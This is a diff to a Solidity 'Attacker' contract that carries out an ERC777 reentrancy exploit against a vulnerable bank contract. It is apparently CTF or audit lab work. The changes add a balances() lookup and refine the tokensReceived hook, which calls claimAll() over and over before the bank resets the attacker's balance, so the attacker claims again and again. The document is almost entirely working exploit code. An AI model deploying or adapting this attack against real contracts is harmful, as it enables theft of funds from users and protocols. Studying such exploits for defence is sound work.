@@ -13,6 +13,7 @@ interface IBank {
     function deposit() external payable;
     function claimAll() external;
     function token() external view returns (IERC777);
+    function balances(address) external view returns (uint256);
 }
 
 /**
@@ -44,8 +45,6 @@ contract Attacker is IERC777Recipient {
 
     /**
      * @dev Executes the attack.
-     * 1. Deposits ETH into the bank to establish a balance
-     * 2. Calls claimAll() to trigger the reentrancy attack
      */
     function attack(uint256 amount) external payable {
         require(msg.sender == owner, "Only owner can attack");
@@ -55,17 +54,12 @@ contract Attacker is IERC777Recipient {
         bank.deposit{value: amount}();
         
         // Step 2: Call the vulnerable claimAll() function
-        // This will mint tokens to us and trigger our tokensReceived hook
         bank.claimAll();
     }
 
     /**
      * @dev ERC777 hook called when tokens are received.
      * This is where the reentrancy attack happens.
-     * 
-     * When claimAll() mints tokens to us, it calls this function BEFORE
-     * updating balances[msg.sender] = 0. So we can call claimAll() again
-     * and drain more tokens.
      */
     function tokensReceived(
         address operator,
@@ -75,12 +69,19 @@ contract Attacker is IERC777Recipient {
         bytes calldata userData,
         bytes calldata operatorData
     ) external override {
-        // Only accept tokens from our target bank's token contract
-        require(msg.sender == address(token), "Invalid token");
+        // Only accept our target bank's token
+        if (msg.sender != address(token)) {
+            revert("Invalid token");
+        }
         
-        // Continue the reentrancy attack as long as the bank still has tokens
-        // The bank can mint unlimited tokens, so we check if it has any in its balance
-        if (token.balanceOf(address(bank)) > 0) {
+        // Only re-enter if the sender is the bank (not other users)
+        if (from != address(bank)) {
+            return;
+        }
+        
+        // Re-enter if our balance in the bank is still positive
+        // This works because claimAll() sets balances[msg.sender] = 0 AFTER minting
+        if (bank.balances(address(this)) > 0) {
             bank.claimAll();
         }
     }
